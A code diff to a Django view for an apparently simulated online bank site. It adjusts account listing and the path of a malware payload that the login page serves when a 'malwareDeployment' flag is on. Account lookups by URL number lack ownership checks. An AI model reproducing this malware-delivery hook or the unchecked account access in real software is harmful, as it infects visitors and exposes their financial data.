@@ -35,12 +35,12 @@ def createArgs(request):
     userAccounts = []
     transactions = {}
     userAccount = ''
-    if request.path == '/accounts/':
-        accounts = account.objects.all()
-        for bankAccount in accounts:
-            if bankAccount.accountOwner.username == request.user.username:
-                userAccounts.append(bankAccount)
-    elif re.match('^\/accounts\/[0-9]{8}', request.path):
+    
+        #accounts = account.objects.all()
+        #for bankAccount in accounts:
+        #    if bankAccount.accountOwner.username == request.user.username:
+        #        userAccounts.append(bankAccount)
+    if re.match('^\/accounts\/[0-9]{8}', request.path):
         userAccount = account.objects.get(accountNumber=re.sub('^\/accounts\/', '', request.path))
         transactions = transaction.objects.filter(account=userAccount)
         transactions = list(transactions)
@@ -48,6 +48,11 @@ def createArgs(request):
         transactions.reverse()
     elif re.match('(^\/transfer\/|\/payment\/)[0-9]{8}', request.path):
         userAccount = account.objects.get(accountNumber=re.sub('(^\/transfer\/|\/payment\/)', '', request.path))
+    
+    if request.user.is_authenticated==True:
+        userAccounts = list(account.objects.filter(accountOwner=request.user))
+        if userAccount != '':
+            userAccounts.remove(userAccount)
 
     if list(MyFlatPage.objects.filter(url=request.path)) != []:
         navbarContents = getNavBarContents(request, pages)
@@ -61,7 +66,7 @@ def createArgs(request):
         'site': site, 'outerTemplate': outerTemplate, 'logo': logo, 'payingAccount': userAccount, 'flatpage': page, 'user': request.user, 'userAccounts': userAccounts, 'font': font, 'transactions': transactions, 'flatpage': page}
     
     if request.path=='/login/' and site.malwareDeployment==True:
-        args['payloadPath'] = 'e' + site.malwareFile.name.lstrip('onlineBank/static/')
+        args['payloadPath'] = re.sub('^onlineBank\/static\/', '', site.malwareFile.name)
 
     return args
 
